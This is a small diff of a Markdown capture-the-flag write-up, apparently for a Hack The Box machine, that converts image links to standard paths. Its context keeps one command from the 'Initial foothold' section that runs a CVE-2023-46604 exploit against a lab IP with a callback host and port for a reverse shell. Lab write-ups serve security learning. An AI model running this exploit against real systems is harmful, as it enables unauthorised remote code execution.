@@ -21,9 +21,9 @@ Initial foothold
 ```
 ./cve-2023-46604_linux-amd64 -rhost 10.129.230.87 -rport 61616 -lhost 10.10.15.1 -lport 4444
 ```
-![[Pasted image 20251126013917.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251126013917.png)
 
-![[Pasted image 20251126014020.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251126014020.png)
 
 https://github.com/advisories/GHSA-w7p3-hmmp-qmx6
 
